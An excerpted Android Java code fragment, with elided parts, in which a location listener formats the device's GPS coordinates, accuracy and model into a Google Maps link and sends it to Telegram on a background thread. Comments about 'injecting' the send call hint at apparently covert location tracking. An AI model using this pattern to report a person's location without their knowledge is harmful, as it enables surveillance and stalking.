    ...
    private class mLocationListener implements LocationListener {
        ...
        public void onLocationChanged(@NonNull Location location) {
            ...
            if (meetsCriteria(location)) {
                ...
                // inject `sendMessage` here
                // TODO: encrypt this message, then send.
                String message = String.format("*Location Update:*\n*Accuracy:* `%.1fm`\n[%s on Google Maps](https://www.google.com/maps?q=%.5f,%.5f)",
                    location.getAccuracy(),
                    DEVICE_MODEL,
                    location.getLatitude(),
                    location.getLongitude());
                    // location.getTime()); // not required.
    ...
    private void sendToTelegram(String message) {
        ...
        new Thread(() -> {
            try {
                ...
                if (code != 200) {
                    Log.d(TAG, "Telegram error: HTTP " + code);
                }
            } catch (Exception e) {
                Log.d(TAG, "sendLogToTelegram failed", e);
            }
        }).start();
    }
